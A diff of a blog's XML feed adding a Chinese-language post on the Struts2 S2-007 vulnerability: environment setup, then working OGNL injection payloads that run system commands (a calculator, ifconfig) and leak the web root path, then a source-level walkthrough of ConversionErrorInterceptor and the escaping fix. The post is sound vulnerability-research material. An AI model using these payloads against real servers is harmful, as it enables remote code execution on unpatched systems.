@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-007</title>
+    <link href="/2020/07/18/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-007/"/>
+    <url>/2020/07/18/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-007/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><p>S2-006 跳过了，因为它的描述太简陋了，无法复现出漏洞环境，以后有空或许会从源码层面再看一看。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.2.1 版本 struts2 + tomcat9，给 Action 加上一个 int 类型的成员，修改传值的表单，再添加一个 input 的 result。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在定义为 int 的成员对应的输入框处输入 OGNL 表达式：</p><pre><code>&#39;+(#application)+&#39;</code></pre><p>可以看到打印出了很多运行和配置的信息，贴几个借的执行命令和回显的表达式，也可以借鉴前面的 S2-003/S2-005 的 payload，这里贴几个借的 payload：</p><pre><code># 弹计算器&#39;+(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,@java.lang.Runtime@getRuntime().exec(&quot;deepin-calculator&quot;))+&#39;&#39;+(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,@java.lang.Runtime@getRuntime().exec(&quot;deepin-calculator&quot;))+&#39;# 获取绝对路径&#39;+(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter().write(#req.getRealPath(&#39;/&#39;)))+&#39;&#39;+(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter().write(#req.getRealPath(&#39;/&#39;)))+&#39;# 执行系统命令并回显&#39;+(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter().write(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(&#39;ifconfig&#39;).getInputStream()).useDelimiter(&quot;\\Z&quot;).next()))+&#39;&#39;+(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter().write(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(&#39;ifconfig&#39;).getInputStream()).useDelimiter(&quot;\\Z&quot;).next()))+&#39;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">漏洞公告</a>，漏洞场景是在发生类型转换时，会将用户输入当作 OGNL 表达式来执行，比如上面漏洞利用中使用的字符串就无法转换为需要的 int 类型而导致错误。详细的<a href="https://issues.apache.org/jira/browse/WW-3668" target="_blank" rel="noopener">漏洞报告</a>里面说漏洞发生在 ConversionErrorInterceptor 类和 RepopulateConversionErrorFieldValidatorSupport 类中，在实际调试中，漏洞发生在 ConversionErrorInterceptor  类的 intercept 方法中：</p><pre><code class="java">@Overridepublic String intercept(ActionInvocation invocation) throws Exception {    ActionContext invocationContext = invocation.getInvocationContext();    Map&lt;String, Object&gt; conversionErrors = invocationContext.getConversionErrors();    ValueStack stack = invocationContext.getValueStack();    HashMap&lt;Object, Object&gt; fakie = null;    for (Map.Entry&lt;String, Object&gt; entry : conversionErrors.entrySet()) {        String propertyName = entry.getKey();        Object value = entry.getValue();        if (shouldAddError(propertyName, value)) {            String message = XWorkConverter.getConversionErrorMessage(propertyName, stack);            Object action = invocation.getAction();            if (action instanceof ValidationAware) {                ValidationAware va = (ValidationAware) action;                va.addFieldError(propertyName, message);            }            if (fakie == null) {                fakie = new HashMap&lt;Object, Object&gt;();            }            fakie.put(propertyName, getOverrideExpr(invocation, value));        }    }    if (fakie != null) {        // if there were some errors, put the original (fake) values in place right before the result        stack.getContext().put(ORIGINAL_PROPERTY_OVERRIDE, fakie);        invocation.addPreResultListener(new PreResultListener() {            public void beforeResult(ActionInvocation invocation, String resultCode) {                Map&lt;Object, Object&gt; fakie = (Map&lt;Object, Object&gt;) invocation.getInvocationContext().get(ORIGINAL_PROPERTY_OVERRIDE);                if (fakie != null) {                    invocation.getStack().setExprOverrides(fakie);                }            }        });    }    return invocation.invoke();}</code></pre><p>如果发生了类型转换错误，哈希表 conversionErrors 中就会保存转换前的用户输入，即表示名的 propertyName 和变量值的 value，然后会执行：</p><pre><code class="java">shouldAddError(propertyName, value)</code></pre><p>来判断是否添加这个错误，而：</p><pre><code class="java">protected boolean shouldAddError(String propertyName, Object value) {    return true;}</code></pre><p>这个函数的返回值用为 true，所以会执行：</p><pre><code class="java">fakie.put(propertyName, getOverrideExpr(invocation, value));</code></pre><p>将他们放入一个新的哈希表 fakie 中，而 getOverrideExpr 是一个拼接字符串的操作：</p><pre><code class="java">protected Object getOverrideExpr(ActionInvocation invocation, Object value) {    return &quot;&#39;&quot; + value + &quot;&#39;&quot;;}</code></pre><p>给输入拼上了前后两个单引号，所以漏洞利用时要进行闭合。</p><p>最后添加一个 PreResult 监听器（看名字是在渲染 Action 的 result 之前触发），并将 fakie 保存起来：</p><pre><code class="java">invocation.getStack().setExprOverrides(fakie);</code></pre><p>接下来找找什么时候会用到，先看看 setExprOverrides 的处理：</p><pre><code class="java">public void setExprOverrides(Map&lt;Object, Object&gt; overrides) {    if (this.overrides == null) {        this.overrides = overrides;    } else {        this.overrides.putAll(overrides);    }}</code></pre><p>看名字 overrides，推测这个错误信息应该是用在渲染模板时的，因为类型转换失败，所以调用成员的 setter 必然是失败的，而渲染模板可能还需要这个成员，所以将原始输入保存起来，渲染模板时可以以成员名作为键访问。</p><p>根据变量名 overrides 找到 lookupForOverrides 方法：</p><pre><code class="java">private String lookupForOverrides(String expr) {    if ((overrides != null) &amp;&amp; overrides.containsKey(expr)) {        expr = (String) overrides.get(expr);    }    return expr;}</code></pre><p>然后断点，找到将其作为表达式执行的 tryFindValue 方法：</p><pre><code class="java">private Object tryFindValue(String expr, Class asType) throws OgnlException {    Object value = null;    try {        expr = lookupForOverrides(expr);        value = getValue(expr, asType);        if (value == null) {            value = findInContext(expr);        }    } finally {        context.remove(THROW_EXCEPTION_ON_FAILURE);    }    return value;}</code></pre><p>可以看到将找到的原始输入当作表达式又执行了一遍，触发了漏洞。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>拼接单引号的时候加了点料：</p><pre><code class="java">protected Object getOverrideExpr(ActionInvocation invocation, Object value) {    return escape(value);}protected String escape(Object value) {    return &quot;\&quot;&quot; + StringEscapeUtils.escapeJava(String.valueOf(value)) + &quot;\&quot;&quot;;}</code></pre><p>做了过滤，具体的可以看 StringEscapeUtils 类的 escapeJavaStyleString 方法。</p><hr><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7971" target="_blank" rel="noopener">https://xz.aliyun.com/t/7971</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-004/ClassLoader</title>
     <link href="/2020/07/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-004/"/>
     <url>/2020/07/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-004/</url>
@@ -324,9 +343,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
     </tags>
     
@@ -1201,9 +1220,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
     </tags>
     
@@ -1243,9 +1262,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
     </tags>
     
